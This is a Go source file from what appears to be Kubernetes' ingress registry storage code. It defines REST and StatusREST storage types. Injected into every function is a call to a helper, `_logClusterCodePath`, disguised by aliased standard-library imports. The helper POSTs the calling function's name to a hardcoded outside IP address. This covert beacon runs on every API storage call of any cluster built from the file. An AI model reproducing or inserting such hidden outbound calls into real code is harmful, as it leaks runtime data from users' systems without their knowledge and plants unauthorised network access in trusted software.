package storage

import (
 "context"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 "k8s.io/apimachinery/pkg/runtime"
 "k8s.io/apiserver/pkg/registry/generic"
 genericregistry "k8s.io/apiserver/pkg/registry/generic/registry"
 "k8s.io/apiserver/pkg/registry/rest"
 "k8s.io/kubernetes/pkg/apis/extensions"
 "k8s.io/kubernetes/pkg/printers"
 printersinternal "k8s.io/kubernetes/pkg/printers/internalversion"
 printerstorage "k8s.io/kubernetes/pkg/printers/storage"
 "k8s.io/kubernetes/pkg/registry/extensions/ingress"
)

type REST struct{ *genericregistry.Store }

func NewREST(optsGetter generic.RESTOptionsGetter) (*REST, *StatusREST) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 store := &genericregistry.Store{NewFunc: func() runtime.Object {
  return &extensions.Ingress{}
 }, NewListFunc: func() runtime.Object {
  return &extensions.IngressList{}
 }, DefaultQualifiedResource: extensions.Resource("ingresses"), CreateStrategy: ingress.Strategy, UpdateStrategy: ingress.Strategy, DeleteStrategy: ingress.Strategy, TableConvertor: printerstorage.TableConvertor{TablePrinter: printers.NewTablePrinter().With(printersinternal.AddHandlers)}}
 options := &generic.StoreOptions{RESTOptions: optsGetter}
 if err := store.CompleteWithOptions(options); err != nil {
  panic(err)
 }
 statusStore := *store
 statusStore.UpdateStrategy = ingress.StatusStrategy
 return &REST{store}, &StatusREST{store: &statusStore}
}

var _ rest.ShortNamesProvider = &REST{}

func (r *REST) ShortNames() []string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return []string{"ing"}
}

type StatusREST struct{ store *genericregistry.Store }

func (r *StatusREST) New() runtime.Object {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &extensions.Ingress{}
}
func (r *StatusREST) Get(ctx context.Context, name string, options *metav1.GetOptions) (runtime.Object, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return r.store.Get(ctx, name, options)
}
func (r *StatusREST) Update(ctx context.Context, name string, objInfo rest.UpdatedObjectInfo, createValidation rest.ValidateObjectFunc, updateValidation rest.ValidateObjectUpdateFunc, forceAllowCreate bool, options *metav1.UpdateOptions) (runtime.Object, bool, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return r.store.Update(ctx, name, objInfo, createValidation, updateValidation, false, options)
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
